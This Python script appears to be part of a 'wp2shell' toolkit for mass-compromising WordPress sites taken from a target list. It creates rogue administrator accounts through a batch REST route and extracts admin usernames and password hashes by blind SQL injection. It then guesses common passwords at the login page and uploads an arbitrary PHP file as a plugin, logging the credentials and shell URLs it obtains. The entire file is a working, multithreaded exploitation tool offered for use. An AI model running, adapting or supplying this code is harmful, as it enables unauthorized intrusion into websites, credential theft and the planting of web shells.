#!/usr/bin/env python3
"""wp2shell bypass oEmbed — upload PHP to confirmed vuln targets where deploy() fails.

Some targets have oEmbed disabled/broken, causing deploy() to fail at the
cache-ID recovery step. This script bypasses that with two methods:

  Method A: Skip oEmbed entirely, try direct batch user creation
            (works if the batch route allows user creation without changeset elevation)
  Method B: Read admin password hash via blind SQLi, try common passwords,
            login + upload PHP

Usage:
  python wp2shell_bypassembed.py -l vuln_targets.txt -p shell.php
  python wp2shell_bypassembed.py -l vuln_targets.txt -p shell.php -n myshell -t 20 -v
"""
from __future__ import print_function

import argparse
import hashlib
import json
import os
import re
import secrets
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

import zephr_wp2shell as z

try:
    from wp2shell.shell import AdminSession
except ImportError:
    AdminSession = None

try:
    from termcolor import colored
except ImportError:
    def colored(text, _color=None):
        return text

if sys.platform == 'win32':
    try:
        import colorama
        colorama.just_fix_windows_console()
    except ImportError:
        pass

OUTPUT_DIR = os.path.join(BASE_DIR, 'vuln_wp2shell')
DEPLOY_FILE = os.path.join(OUTPUT_DIR, 'wp2shell_deploy.txt')
FAIL_FILE = os.path.join(OUTPUT_DIR, 'wp2shell_deploy_fail.txt')

_write_lock = threading.RLock()
_print_lock = threading.RLock()
_stats_lock = threading.Lock()
_stats = {'done': 0, 'ok': 0, 'fail': 0, 'total': 0}

BLOCK_RE = re.compile(
    r'Internet Positif|Just a moment|cf-browser-verification|Request Rejected|'
    r'Attention Required|Access Denied',
    re.I,
)

COMMON_PASSWORDS = [
    'admin', 'password', '123456', '12345678', '123456789', '12345',
    'qwerty', 'abc123', 'letmein', 'master', '111111', '1234567',
    '1234567890', 'test', 'password1', 'changeme', 'welcome',
    'wordpress', 'wp-admin', 'root', 'toor', 'pass', 'test123',
    'admin123', 'password123', '123123', 'default', 'P@ssw0rd',
]

BANNER = r"""
  _____          _         ____
 |__  /___ _ __ | |__  _ _/ ___|  ___  ___
   / // _ \ '_ \| '_ \| '__\___ \ / _ \/ __|
  / /|  __/ |_) | | | | |   ___) |  __/ (__
 /____\___| .__/|_| |_|_|  |____/ \___|\___|
          |_|     wp2shell bypass-oEmbed  -  ZephrSec
"""


def _ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)


def _append(path, line):
    _ensure_dirs()
    with _write_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(line.rstrip() + '\n')


def _log(msg, color=None):
    with _print_lock:
        print(colored(msg, color) if color else msg, flush=True)


def _strip_scheme(url):
    url = (url or '').strip()
    if url.startswith('https://'):
        return url[8:]
    if url.startswith('http://'):
        return url[7:]
    return url


def detect_scheme(url, timeout=8, force_probe=False):
    raw = (url or '').strip()
    if not raw:
        return ''
    host = _strip_scheme(raw).rstrip('/')
    if force_probe:
        for scheme in ('https://', 'http://'):
            try:
                st, _ = z.http(scheme + host + '/')
                if st is not None:
                    return scheme + host
            except Exception:
                pass
        return 'https://' + host
    if raw.startswith(('http://', 'https://')):
        try:
            st, _ = z.http(raw + '/')
            if st is not None:
                return raw.rstrip('/')
        except Exception:
            pass
        alt = ('https://' if raw.startswith('http://') else 'http://') + host
        try:
            st, _ = z.http(alt + '/')
            if st is not None:
                return alt.rstrip('/')
        except Exception:
            pass
        return raw.rstrip('/')
    for scheme in ('https://', 'http://'):
        try:
            st, _ = z.http(scheme + host + '/')
            if st is not None:
                return scheme + host
        except Exception:
            pass
    return 'https://' + host


def ensure_scheme(url):
    url = (url or '').strip()
    if not url:
        return ''
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')


def parse_target_line(line):
    line = line.strip()
    if not line:
        return None
    m = re.match(r'(https?://[^\s]+)', line)
    if m:
        return m.group(1).rstrip('/')
    parts = line.split()
    if parts:
        return ensure_scheme(parts[0])
    return None


def load_targets(path):
    seen = set()
    urls = []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            url = parse_target_line(line)
            if not url:
                continue
            key = url.lower().rstrip('/')
            if key in seen:
                continue
            seen.add(key)
            urls.append(url)
    return urls


def _progress_tick(url, success, reason=''):
    with _stats_lock:
        _stats['done'] += 1
        if success:
            _stats['ok'] += 1
        else:
            _stats['fail'] += 1
        done = _stats['done']
        total = _stats['total']
        ok = _stats['ok']
        fail = _stats['fail']
    tag = colored('OK', 'green') if success else colored('FAIL', 'red')
    extra = ' (%s)' % reason if reason else ''
    _log('[%d/%d] %s -> %s%s' % (done, total, url, tag, extra))
    if done == total or done % 50 == 0:
        _log('[*] Progress: %d/%d | ok: %d | fail: %d' % (done, total, ok, fail), 'cyan')


# ── Method A: Direct batch user creation (skip oEmbed) ───────────────

def _try_direct_batch(eng, verbose=False):
    """Try creating admin via batch route without oEmbed changeset.

    Sends POST /wp/v2/users directly in the batch extra_requests.
    This works on targets where the batch route doesn't enforce auth
    for user creation when triggered via the SQLi confusion path.
    Returns (user, password) or raises.
    """
    _v = lambda msg: _log(msg, 'cyan') if verbose else None

    _v('[*] Method A: direct batch user creation (skip oEmbed)...')

    eng._normalize_base()
    eng.batch = None
    for ep in eng._endpoints():
        st, _, _, final = eng._raw(ep, data=b'{}',
                                    headers={"Content-Type": "application/json"},
                                    method="POST")
        if st in (200, 207):
            eng.batch = final
            break
    if eng.batch is None:
        eng.batch = eng._endpoints()[0]

    username = "w2s_%s" % secrets.token_hex(6)
    password = "W2s!%s" % secrets.token_urlsafe(15)
    email = "%s@wp2shell.local" % username
    new_admin = {"username": username, "email": email,
                 "password": password, "roles": ["administrator"]}

    payload = {"requests": [
        {"method": "POST", "path": "http://:"},
        {"method": "GET", "path": "/wp/v2/posts?per_page=1"},
        {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
        {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
    ]}
    body = json.dumps(payload).encode()
    headers = {"Content-Type": "application/json", "User-Agent": eng.UA}

    try:
        st, _, resp_data, _ = eng._raw(eng.batch, data=body, headers=headers,
                                        method="POST", retries=2)
    except Exception as e:
        raise RuntimeError("batch request failed: %s" % e)

    resp_text = resp_data.decode(errors="replace") if isinstance(resp_data, bytes) else str(resp_data)

    if '"id"' in resp_text and username in resp_text:
        _v('[+] Method A: user created via batch')
        return username, password

    if '"code":"rest_cannot_create_user"' in resp_text:
        _v('[*] Method A: user creation blocked (needs auth)')
    elif '"code":"rest_user_invalid_argument"' in resp_text:
        _v('[*] Method A: user creation invalid argument')
    else:
        _v('[*] Method A: user creation response: %s' % resp_text[:200])

    raise RuntimeError("direct batch user creation failed")


# ── Method B: Read admin hash + crack + login ────────────────────────

def _read_admin_via_sqli(eng, verbose=False, sleep=4.0, unit=None):
    """Read the first admin's username and password hash via blind SQLi.
    Returns (username, password_hash) or raises.
    """
    _v = lambda msg: _log(msg, 'cyan') if verbose else None
    _v('[*] Method B: reading admin credentials via blind SQLi...')

    if unit is None:
        unit = max(0.8, sleep * 0.35)

    eng._normalize_base()
    det = eng.detect(rounds=2)
    if not det.get('vulnerable'):
        raise RuntimeError("SQLi not confirmed")

    _v('[+] SQLi confirmed (delta=%.2fs)' % det.get('delta', 0))

    posts_table = ""
    query_posts = (
        "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
        "WHERE TABLE_SCHEMA=DATABASE() "
        "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
        "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1"
    )
    for u in (unit, max(1.2, sleep * 0.4), max(1.8, sleep * 0.5)):
        try:
            cand = eng.read_scalar(query_posts, 64, unit=u)
        except Exception:
            cand = ""
        if re.fullmatch(r"[A-Za-z0-9_$]+_posts", cand or ""):
            posts_table = cand
            break
    if not posts_table:
        for cand in ("wp_posts", "wordpress_posts"):
            try:
                ok = eng._oracle(
                    "EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES "
                    "WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME=%s)" % eng._hex(cand),
                    unit=unit,
                )
            except Exception:
                ok = False
            if ok:
                posts_table = cand
                break
    if not posts_table:
        raise RuntimeError("could not resolve posts table")

    prefix = posts_table[:-5]
    _v('[+] table prefix: %s' % (prefix or "(empty)"))

    admin_id = eng.read_int(
        "SELECT u.ID FROM `%susers` u JOIN `%susermeta` m "
        "ON m.user_id=u.ID WHERE m.meta_key=%s "
        "AND INSTR(m.meta_value,%s)>0 "
        "ORDER BY u.ID LIMIT 1" % (
            prefix, prefix,
            eng._hex(prefix + "capabilities"),
            eng._hex('s:13:"administrator";b:1;')))
    if admin_id < 1:
        raise RuntimeError("no admin found")

    _v('[+] admin ID: %d' % admin_id)

    username = eng.read_scalar(
        "SELECT user_login FROM `%susers` WHERE ID=%d" % (prefix, admin_id),
        maxlen=60, unit=unit)
    if not username:
        raise RuntimeError("could not read admin username")
    _v('[+] admin username: %s' % username)

    user_pass = eng.read_scalar(
        "SELECT user_pass FROM `%susers` WHERE ID=%d" % (prefix, admin_id),
        maxlen=255, unit=unit)
    if not user_pass:
        raise RuntimeError("could not read admin password hash")
    _v('[+] admin hash: %s...' % user_pass[:30])

    return username, user_pass, eng


def _try_common_passwords(username, user_pass, base_url, verbose=False, timeout=30):
    """Try common passwords against the admin account. Returns password or None."""
    _v = lambda msg: _log(msg, 'cyan') if verbose else None
    _v('[*] trying %d common passwords...' % len(COMMON_PASSWORDS))

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    jar = urllib.request.CookieJar()
    handlers = [urllib.request.HTTPSHandler(context=ctx),
                urllib.request.HTTPCookieProcessor(jar)]
    opener = urllib.request.build_opener(*handlers)
    opener.addheaders = [("User-Agent", "wp2shell/1.0")]

    for pw in COMMON_PASSWORDS:
        try:
            opener.open(urllib.request.Request(
                base_url + "/wp-login.php",
                headers={"User-Agent": "wp2shell/1.0"}), timeout=15).read()
            opener.open(urllib.request.Request(
                base_url + "/wp-login.php",
                data=urllib.parse.urlencode({
                    "log": username, "pwd": pw, "wp-submit": "Log In",
                    "redirect_to": base_url + "/wp-admin/",
                    "testcookie": "1"}).encode(),
                headers={"User-Agent": "wp2shell/1.0"},
                method="POST"), timeout=30).read()

            if any(c.name.startswith("wordpress_logged_in") for c in jar):
                _v('[+] password found: %s' % pw)
                return pw
        except Exception:
            pass
        jar.clear()

    _v('[-] no common password matched')
    return None


# ── Main deploy logic ────────────────────────────────────────────────

def deploy_one(url, php_path, plugin_name, timeout, auto_detect, verbose, sleep=4.0):
    """Deploy PHP to a single target. Tries multiple bypass methods."""
    z.TIMEOUT = int(timeout)
    z.DEFAULT_TIMEOUT = int(timeout)

    if auto_detect:
        url = detect_scheme(url, timeout=8, force_probe=True)
    else:
        url = ensure_scheme(url)

    _v = lambda msg: _log(msg, 'cyan') if verbose else None
    _v('[*] target: %s' % url)

    eng = z.PreAuthRCE(url, timeout=max(float(timeout), 120.0), sleep=sleep, route='auto')

    # ── Method A: try deploy() first (might work if oEmbed works on this target) ──
    _v('[1/3] trying standard deploy (with oEmbed)...')
    try:
        user, pw, run, cleanup = eng.deploy()
        _v('[+] deploy OK: %s:%s' % (user, pw))

        if AdminSession is not None:
            sess = AdminSession(url, timeout=max(float(timeout), 60.0))
            if sess.login(user, pw):
                php_result = sess.deploy_custom_php(php_path, plugin_name=plugin_name)
                php_url = url.rstrip('/') + php_result
                _log('[+] DEPLOYED %s | %s | user=%s pass=%s' % (url, php_url, user, pw), 'green')
                _append(DEPLOY_FILE, '%s user=%s pass=%s url=%s' % (url, user, pw, php_url))
                try:
                    cleanup()
                except Exception:
                    pass
                return True, php_url

        _v('[*] login/upload failed after deploy')
        try:
            cleanup()
        except Exception:
            pass
    except Exception as e:
        _v('[*] standard deploy failed: %s' % e)

    # ── Method B: direct batch user creation (skip oEmbed) ──
    _v('[2/3] trying direct batch user creation (skip oEmbed)...')
    try:
        user, pw = _try_direct_batch(eng, verbose=verbose)
        _v('[+] direct batch OK: %s:%s' % (user, pw))

        if AdminSession is not None:
            sess = AdminSession(url, timeout=max(float(timeout), 60.0))
            if sess.login(user, pw):
                php_result = sess.deploy_custom_php(php_path, plugin_name=plugin_name)
                php_url = url.rstrip('/') + php_result
                _log('[+] DEPLOYED %s | %s | user=%s pass=%s' % (url, php_url, user, pw), 'green')
                _append(DEPLOY_FILE, '%s user=%s pass=%s url=%s' % (url, user, pw, php_url))
                return True, php_url
            else:
                _v('[*] login failed after direct batch')
    except Exception as e:
        _v('[*] direct batch failed: %s' % e)

    # ── Method C: read hash + try common passwords ──
    _v('[3/3] reading admin hash + trying common passwords...')
    try:
        username, user_pass, eng2 = _read_admin_via_sqli(eng, verbose=verbose, sleep=sleep)

        if user_pass.startswith('$P$') or user_pass.startswith('$H$'):
            pw = _try_common_passwords(username, user_pass, url, verbose=verbose, timeout=timeout)
        else:
            pw = None
            _v('[*] hash format not WP-compatible: %s...' % user_pass[:20])

        if pw and AdminSession is not None:
            sess = AdminSession(url, timeout=max(float(timeout), 60.0))
            if sess.login(username, pw):
                php_result = sess.deploy_custom_php(php_path, plugin_name=plugin_name)
                php_url = url.rstrip('/') + php_result
                _log('[+] DEPLOYED %s | %s | user=%s pass=%s (cracked)' % (url, php_url, username, pw), 'green')
                _append(DEPLOY_FILE, '%s user=%s pass=%s url=%s method=cracked' % (url, username, pw, php_url))
                return True, php_url
            else:
                _v('[*] login failed with cracked password')
        elif pw is None:
            _v('[*] password not cracked')
    except Exception as e:
        _v('[*] hash read/crack failed: %s' % e)

    return False, 'all methods failed'


def process_target(url, php_path, plugin_name, timeout, auto_detect, verbose):
    try:
        ok, reason = deploy_one(url, php_path, plugin_name, timeout, auto_detect, verbose)
    except Exception as e:
        ok = False
        reason = str(e)
        if verbose:
            _log('[-] error: %s' % e, 'red')
    _progress_tick(url, ok, reason)
    if not ok:
        _append(FAIL_FILE, '%s reason=%s' % (url, reason))


def main():
    _log(BANNER, 'cyan')

    ap = argparse.ArgumentParser(
        description='wp2shell bypass-oEmbed — deploy PHP to confirmed vuln targets')
    ap.add_argument('-l', '--list', dest='list_file', required=True,
                    help='Target list file (confirmed vuln lines or plain URLs)')
    ap.add_argument('-p', '--php', dest='php_file', required=True,
                    help='PHP file to upload as plugin')
    ap.add_argument('-n', '--name', dest='plugin_name', default=None,
                    help='Custom plugin slug (default: random wp2custom_<hex>)')
    ap.add_argument('-t', '--threads', type=int, default=5,
                    help='Thread workers (default 5)')
    ap.add_argument('--timeout', type=float, default=120.0,
                    help='HTTP timeout seconds (default 120)')
    ap.add_argument('--sleep', type=float, default=4.0,
                    help='SQLi SLEEP seconds (default 4)')
    ap.add_argument('-D', '--auto-detect', action='store_true',
                    help='Auto-detect HTTP/HTTPS for each target')
    ap.add_argument('-v', '--verbose', action='store_true',
                    help='Verbose per-target logs')
    args = ap.parse_args()

    if not os.path.isfile(args.list_file):
        _log('[-] List file not found: %s' % args.list_file, 'red')
        return 1
    if not os.path.isfile(args.php_file):
        _log('[-] PHP file not found: %s' % args.php_file, 'red')
        return 1

    _ensure_dirs()
    urls = load_targets(args.list_file)
    if not urls:
        _log('[-] No targets found in %s' % args.list_file, 'red')
        return 1

    with _stats_lock:
        _stats['done'] = 0
        _stats['ok'] = 0
        _stats['fail'] = 0
        _stats['total'] = len(urls)

    _log('[*] Targets: %d | Threads: %d | PHP: %s' % (len(urls), args.threads, args.php_file), 'cyan')
    if args.plugin_name:
        _log('[*] Plugin name: %s' % args.plugin_name, 'cyan')
    _log('[*] Methods: A=direct batch | B=read hash+crack | C=standard deploy', 'cyan')
    _log('[*] Output: %s' % OUTPUT_DIR, 'cyan')
    _log('\u2500' * 60, 'cyan')

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = [
            pool.submit(
                process_target, u, args.php_file, args.plugin_name,
                args.timeout, args.auto_detect, args.verbose,
            )
            for u in urls
        ]
        for fut in as_completed(futures):
            try:
                fut.result()
            except Exception:
                pass

    with _stats_lock:
        done, ok, fail = _stats['done'], _stats['ok'], _stats['fail']

    _log('\u2500' * 60, 'cyan')
    _log('[*] Done. %d targets | %s | %s' % (
        done,
        colored('%d deployed' % ok, 'green'),
        colored('%d failed' % fail, 'red'),
    ), 'cyan')
    _log('[*] Results: %s' % DEPLOY_FILE, 'cyan')
    if fail:
        _log('[*] Failures: %s' % FAIL_FILE, 'yellow')
    return 0


if __name__ == '__main__':
    try:
        sys.exit(main() or 0)
    except KeyboardInterrupt:
        print(colored('\n[!] Interrupted.', 'yellow'))
        sys.exit(130)
